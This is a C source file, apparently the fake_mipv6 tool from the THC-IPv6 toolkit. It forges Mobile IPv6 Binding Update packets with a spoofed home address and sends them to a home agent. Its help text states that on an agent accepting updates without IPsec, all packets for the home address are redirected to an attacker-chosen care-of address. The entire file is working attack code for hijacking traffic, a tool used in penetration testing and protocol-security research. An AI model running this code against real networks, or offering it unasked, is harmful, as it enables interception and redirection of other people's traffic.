#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

unsigned char buf[64];
int           buf_len = 0;

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s interface home-address home-agent-address "
      "care-of-address\n\n",
      prg);
  printf(
      "If the mobile IPv6 home-agent is mis-configured to accept MIPV6 updates "
      "without\n");
  printf(
      "IPSEC, this will redirect all packets for home-address to "
      "care-of-address\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt1 = NULL;
  unsigned char *h = NULL, *ha = NULL, *coa = NULL, *mac = NULL;
  int            pkt1_len = 0, rawmode = 0;
  unsigned int   id = 2, i;
  char *         interface;
  thc_ipv6_hdr * hdr;

  if (argc < 4 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  interface = argv[1];
  h = thc_resolve6(argv[2]);
  ha = thc_resolve6(argv[3]);
  coa = thc_resolve6(argv[4]);

  if (rawmode == 0 && (mac = thc_get_mac(interface, coa, ha)) == NULL) {
    fprintf(stderr, "ERROR: Can not resolve mac address for %s\n", argv[2]);
    exit(-1);
  }

  if (thc_get_own_ipv6(interface, NULL, PREFER_GLOBAL) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }

  for (i = 0; i < 4; i++) {
    memset(buf, 0, sizeof(buf));
    buf[0] = 1;
    buf[1] = 2;
    buf[4] = 201;
    buf[5] = 16;
    memcpy(&buf[6], h, 16);
    buf_len = 22;

    if ((pkt1 = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt1_len,
                                         coa, ha, 64, 0, 0, 0, 0)) == NULL)
      return -1;
    hdr = (thc_ipv6_hdr *)pkt1;
    hdr->original_src = h;
    if (thc_add_hdr_dst(pkt1, &pkt1_len, buf, buf_len) < 0) return -1;
    memset(buf, 0, sizeof(buf));
    buf[0] = 59;
    buf[1] = 3;
    buf[2] = 5;
    buf[3] = 0;
    buf[6] = (id % 65536) / 256;
    buf[7] = id % 256;
    buf[8] = 192;
    buf[10] = 0xff;
    buf[11] = 0xff;
    buf[12] = 1;
    buf[14] = 3;
    buf[15] = 16;
    memcpy(&buf[16], coa, 16);
    buf_len = 32;
    if (thc_add_data6(pkt1, &pkt1_len, NXT_MIPV6, buf, buf_len) < 0) return -1;

    thc_generate_and_send_pkt(interface, NULL, mac, pkt1, &pkt1_len);

    id += 16384;
  }

  return 0;
}
